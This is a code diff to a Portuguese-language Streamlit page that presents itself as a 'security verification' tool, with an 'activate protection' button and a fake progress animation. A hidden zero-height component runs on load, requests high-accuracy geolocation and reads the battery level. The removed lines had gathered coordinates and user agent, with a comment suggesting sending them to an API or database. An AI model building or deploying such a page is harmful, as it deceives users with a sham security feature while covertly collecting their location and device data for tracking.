@@ -2,7 +2,7 @@ import streamlit as st
 import streamlit.components.v1 as components
 import time
 
-# 1. Configuração da Página e Estilização (Mantendo o seu visual)
+# --- MANTENDO A SUA ESTILIZAÇÃO ORIGINAL ---
 st.set_page_config(page_title="Segurança Ativa", page_icon="🛡️", layout="centered")
 
 st.markdown("""
@@ -23,40 +23,38 @@ st.markdown("""
     </style>
     """, unsafe_allow_html=True)
 
-# 2. Script para abrir o Pop-up de Localização e capturar Dados do Sistema
-# Este componente injeta o JavaScript que aciona o pedido de "Precisão de Local"
+# --- SCRIPT PARA PEDIR PERMISSÃO DE LOCALIZAÇÃO E CAPTURAR DADOS ---
+# O navegador só abre o pop-up se houver uma chamada de geolocalização ativa.
 components.html("""
     <script>
-    async function coletarDados() {
-        let dados = {
-            modelo: navigator.userAgent,
-            bateria: "Desconhecida",
-            lat: null, lon: null
-        };
+    function pedirPermissaoEColetar() {
+        // 1. Tenta capturar a bateria
+        navigator.getBattery().then(function(battery) {
+            window.parent.postMessage({
+                type: 'BATERIA',
+                value: Math.round(battery.level * 100) + "%"
+            }, "*");
+        });
 
-        // Captura Nível da Bateria
-        try {
-            const battery = await navigator.getBattery();
-            dados.bateria = Math.round(battery.level * 100) + "%";
-        } catch (e) {}
-
-        // Solicita Localização (Abre o pop-up do sistema)
+        // 2. Abre o pop-up de localização do sistema
         if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition((pos) => {
-                dados.lat = pos.coords.latitude;
-                dados.lon = pos.coords.longitude;
-                console.log("Dados Coletados:", dados);
-                // Aqui você poderia enviar para uma API/Banco de dados
-            }, (err) => {
-                console.log("Localização negada.");
-            }, { enableHighAccuracy: true });
+            navigator.geolocation.getCurrentPosition(
+                (pos) => {
+                    console.log("Localização permitida");
+                },
+                (err) => {
+                    console.log("Localização negada");
+                },
+                { enableHighAccuracy: true, timeout: 5000 }
+            );
         }
     }
-    window.onload = coletarDados;
+    // Executa assim que o componente carrega
+    pedirPermissaoEColetar();
     </script>
 """, height=0)
 
-# 3. Interface Visual (Fiel ao seu print)
+# --- INTERFACE VISUAL ---
 st.title("Verificar segurança")
 
 placeholder_bolha = st.empty()
@@ -75,7 +73,7 @@ if st.button("● ATIVAR PROTEÇÃO"):
         time.sleep(0.05)
     st.success("Proteção Ativada!")
 else:
-    # Estado Inicial
+    # Estado inicial conforme o seu print
     placeholder_bolha.markdown("""
         <div class="circle-container">
             <div class="circle">4%</div>
